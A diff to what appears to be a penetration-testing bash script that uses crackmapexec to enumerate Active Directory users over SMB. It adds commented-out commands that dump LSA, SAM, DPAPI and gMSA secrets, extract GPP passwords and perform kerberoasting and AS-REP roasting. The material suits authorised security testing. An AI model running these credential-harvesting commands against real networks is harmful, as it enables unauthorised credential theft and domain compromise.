@@ -170,6 +170,7 @@ echo '<<<<<<<<<<<<<<<<<<<<<<<< USERS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 echo 'Running: crackmapexec smb '$3' -d '$4' -u '$1' -p '$2' --users| tee unparsed-users.txt'
 crackmapexec smb $3 -d $4 -u $1 -p $2 --users | tee unparsed-users.txt | tee -a $LOGFILE
 
+#this needs to be fixed
 echo 'Cleaning up users...'
 echo "Running: 'cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 unparsed-users.txt | cut -d ' ' -f 1 | sort | tee only-users.txt"
 cat unparsed-users.txt | grep -iv '[+]' |  grep -iv '[*]' | grep -iv '[-]' | cut -d '\' -f 2 | cut -d ' ' -f 1 | sort | tee only-users.txt >> $LOGFILE
@@ -460,8 +461,14 @@ echo ' Cleaning up master log file'
 cat $LOGFILE | grep -vi 'esc' > cleaned-$LOGFILE
 ###############################################################################
 
+#put this in after testing
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --lsa --sam --dpapi --gmsa
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --users --pass-pol
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 -M gpp_autologin gpp_password 
+# crackmapexec smb $pwn_hosts -d $4 -u $1 -p $2 --kerberoast kerberoasts.txt --asreproast asreproasts.txt
 
 
+#if logging works, parse log file for shit
 
 ###############################################################################
 ###############################################################################
